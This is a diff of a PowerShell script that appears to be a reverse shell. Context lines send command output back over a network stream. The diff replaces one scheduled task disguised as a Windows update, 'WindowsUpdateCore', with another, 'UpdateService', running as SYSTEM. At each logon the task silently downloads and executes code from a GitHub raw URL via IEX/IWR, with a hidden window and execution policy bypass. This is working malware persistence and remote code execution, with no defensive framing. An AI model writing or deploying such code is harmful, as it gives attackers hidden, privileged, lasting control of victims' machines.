@@ -22,12 +22,7 @@ try {
         $sendBytes = ([System.Text.Encoding]::ASCII).GetBytes($result)
         $stream.Write($sendBytes, 0, $sendBytes.Length)
     }
-
-    $taskName = "WindowsUpdateCore"
-    $cmd = "-WindowStyle Hidden -ExecutionPolicy Bypass -c `"IEX (IWR 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')`""
-    
-    schtasks /delete /tn "$taskName" /f 2>$null | Out-Null
-    schtasks /create /tn "$taskName" /tr "powershell.exe $cmd" /sc onlogon /rl highest /f | Out-Null
+    schtasks /create /tn "UpdateService" /tr "powershell -WindowStyle Hidden -Exec Bypass -c iex(iwr 'raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')" /sc onlogon /ru SYSTEM /f
 
 } catch {}
 finally {
